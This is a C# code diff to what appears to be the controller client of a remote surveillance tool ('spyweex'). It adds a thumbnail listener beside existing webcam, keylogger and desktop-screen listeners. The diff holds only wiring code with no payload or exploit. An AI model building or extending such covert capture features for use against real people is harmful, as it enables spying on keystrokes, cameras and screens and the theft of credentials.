@@ -54,6 +54,7 @@ namespace spyweex_client_wpf
         private WebCamPicListener _webCamPicListener;
         private KeyloggerListener _keyloggerListener;
         private DesktopScreenListener _desktopScreenListener;
+        private ThumbnailListener _thumbnailListener;
 
         /// <summary>
         /// Verifies if the console is attached or not
@@ -207,6 +208,7 @@ namespace spyweex_client_wpf
             _desktopScreenListener = new DesktopScreenListener();
             _webCamPicListener = new WebCamPicListener();
             _keyloggerListener = new KeyloggerListener();
+            _thumbnailListener = new ThumbnailListener();
 
             _keyEndPoint = ((IPEndPoint)tcpClient.Client.RemoteEndPoint);
             _asyncTaskExecutor = new AsyncTaskExecutor(this);
@@ -229,6 +231,11 @@ namespace spyweex_client_wpf
             _keyloggerListener.Subscribe(this);
         }
 
+        public void ThumbnailListenerSubscribe()
+        {
+            _thumbnailListener.Subscribe(this);
+        }
+
         public bool isDesktopScreenListenerSubscribed()
         {
             return _desktopScreenListener.isSubscribed;
@@ -244,6 +251,11 @@ namespace spyweex_client_wpf
             return _keyloggerListener.isSubscribed;
         }
 
+        public bool isThumbnailListenerSubscribed()
+        {
+            return _thumbnailListener.isSubscribed;
+        }
+
         public void DesktopScreenListenerUnSubscribe()
         {
             _desktopScreenListener.UnsubscribeAsync();
@@ -257,6 +269,11 @@ namespace spyweex_client_wpf
         public void KeyloggerListenerUnSubscribe()
         {
             _keyloggerListener.UnsubscribeAsync();
+        }
+
+        public void ThumbnailListenerUnSubscribe()
+        {
+            _thumbnailListener.UnsubscribeAsync();
         }
 
         #endregion
